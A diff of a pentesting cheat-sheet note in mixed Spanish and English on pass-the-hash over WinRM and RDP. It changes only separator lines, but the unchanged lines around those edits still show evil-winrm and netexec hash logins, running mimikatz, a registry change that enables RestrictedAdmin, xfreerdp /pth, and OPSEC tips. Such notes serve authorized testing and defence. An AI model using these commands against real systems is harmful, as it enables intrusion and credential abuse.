@@ -20,7 +20,7 @@ linked:
 ---
 # Pass-the-Hash - WinRM y RDP
 
-***
+---
 
 ## evil-winrm (Linux)
 
@@ -46,7 +46,7 @@ evil-winrm -i 10.10.10.5 -u corp\jsmith -H aabbccdd1122334455... -S
 *Evil-WinRM* PS> .\mimikatz.exe
 ```
 
-___
+---
 
 ## netexec WinRM
 
@@ -67,7 +67,7 @@ nxc winrm <pwned-host> -u corp\jsmith -H aabbcc... -X '<payload>'
 
 **Permission required:** `Remote Management Users` group OR `Administrators` local. WinRM service running (`winrm quickconfig` o GPO).
 
-___
+---
 
 ## Impacket-WMIExec (Alternativa)
 
@@ -79,7 +79,7 @@ ___
 
 **Caveat:** WMIExec requiere SMB admin (output via `\\target\ADMIN$`). NO es equivalente directo a WinRM.
 
-___
+---
 
 ## RDP RestrictedAdmin Mode (PtH)
 
@@ -103,7 +103,7 @@ reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t
 xfreerdp /v:10.10.10.5 /u:atacante /d:corp.local /pth:aabbcc11... /dynamic-resolution
 ```
 
-___
+---
 
 ## RestrictedAdmin Default Status
 
@@ -117,7 +117,7 @@ ___
 
 **Realidad práctica:** RDP PtH **no funciona out-of-the-box** moderno. Si pega = misconfig específico o ya pwneaste el host (registry write).
 
-___
+---
 
 ## WinRM Permissions Audit
 
@@ -129,7 +129,7 @@ ___
 | `nxc winrm <target> -u u -H <NT>` (output `Pwn3d!`) | Validate | Pre-attack. |
 ^pth-winrm-perms
 
-___
+---
 
 ## OPSEC Considerations
 
@@ -144,7 +144,7 @@ ___
 | Connection from non-jumphost source | Anomaly | Defender side. |
 ^pth-winrm-opsec
 
-___
+---
 
 ## Common Errors
 
@@ -157,4 +157,4 @@ ___
 | RDP login fails con `/pth:` | RestrictedAdmin disabled en target | Registry enable o use other method. |
 ^pth-winrm-errors
 
-***
+---
